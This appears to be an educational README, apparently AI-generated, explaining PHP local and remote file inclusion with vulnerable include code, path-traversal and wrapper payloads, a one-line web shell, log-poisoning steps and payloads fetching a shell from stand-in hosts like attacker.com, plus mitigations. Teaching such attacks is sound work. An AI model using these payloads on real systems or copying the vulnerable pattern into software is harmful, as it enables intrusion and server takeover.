Sure! Here's an extended and **all-in-one Markdown text** for your `README.md`, with more examples, clear definitions, exploitation techniques, and mitigation tips for **LFI (Local File Inclusion)** and **RFI (Remote File Inclusion)**:

---

```markdown
# 🔍 LFI & RFI Vulnerabilities - Explained with Examples

## 📘 Introduction

**Local File Inclusion (LFI)** and **Remote File Inclusion (RFI)** are critical web vulnerabilities that occur when user input is passed to file-inclusion functions (like `include`, `require`, `include_once`, `require_once`) without proper validation. These vulnerabilities can lead to sensitive data exposure, information disclosure, and even remote code execution.

---

## 📂 What is LFI (Local File Inclusion)?

**LFI** allows an attacker to trick the server into including local files (files that exist on the server). This usually happens due to insecure dynamic file loading based on user input.

### ✅ LFI Example (PHP)

```php
<?php
  $page = $_GET['page'];
  include($page);
?>
```

If accessed like:

```
http://example.com/index.php?page=about.php
```

An attacker can exploit it as:

```
http://example.com/index.php?page=../../../../etc/passwd
```

This can show the content of the `/etc/passwd` file (on Linux systems).

### 📁 Common LFI Payloads

- `?page=../../../../etc/passwd`
- `?page=../../../../var/log/apache2/access.log`
- `?page=php://filter/convert.base64-encode/resource=index.php`
- `?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==` (if data wrapper is enabled)

---

## 🌐 What is RFI (Remote File Inclusion)?

**RFI** allows an attacker to include a remote file hosted on another server. If the server is misconfigured (i.e., `allow_url_include = On`), a remote script can be fetched and executed — leading to full compromise.

### ✅ RFI Example (PHP)

```php
<?php
  $page = $_GET['page'];
  include($page);
?>
```

If accessed like:

```
http://example.com/index.php?page=http://attacker.com/shell.txt
```

The `shell.txt` could contain:

```php
<?php system($_GET['cmd']); ?>
```

And the attacker could run:

```
http://example.com/index.php?page=http://attacker.com/shell.txt&cmd=id
```

Resulting in command execution.

---

## 🔥 Real-World Exploitation Scenarios

### 🐚 LFI to RCE via Log Poisoning

1. Send a request with malicious PHP code in the User-Agent:
   ```
   User-Agent: <?php system($_GET['cmd']); ?>
   ```

2. Then load the Apache log file:
   ```
   http://example.com/index.php?page=../../../../var/log/apache2/access.log&cmd=ls
   ```

3. Code gets executed when the file is included!

---

### 📸 LFI using Base64 Wrapper

```php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

This encodes the source code of the file in base64, useful for code disclosure without execution.

---

## 💣 Impact of LFI & RFI

| Vulnerability | Possible Impact |
|---------------|------------------|
| LFI           | Sensitive file disclosure, RCE via log poisoning, session hijacking |
| RFI           | Remote Code Execution, server takeover, malware injection |

---

## 🛡️ Mitigation & Best Practices

- Never include files based directly on user input.
- Use whitelists for permitted files.
- Disable remote file inclusion in `php.ini`:
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```
- Validate and sanitize all input using strict filtering.
- Use absolute paths or hardcoded file mappings instead of dynamic includes.

---

## 🧪 Test Your App

### LFI Test Payloads:

```
?page=../../../../etc/passwd
?page=../../../../boot.ini
?page=php://filter/convert.base64-encode/resource=index.php
```

### RFI Test Payloads:

```
?page=http://evil.com/malicious.txt
?page=https://attacker.site/backdoor.php
```

---

## 🧠 References

- [OWASP - Local File Inclusion](https://owasp.org/www-community/attacks/Local_File_Inclusion)
- [OWASP - Remote File Inclusion](https://owasp.org/www-community/attacks/Remote_File_Inclusion)
- [PHP Wrappers](https://www.php.net/wrappers)

---

## 👨‍💻 Author

Made for security researchers, CTF players, and students.  
Keep learning, stay ethical! 🛡️

```
** Younes SABER**
[seeyou](https://github.com/seeyou7)
---


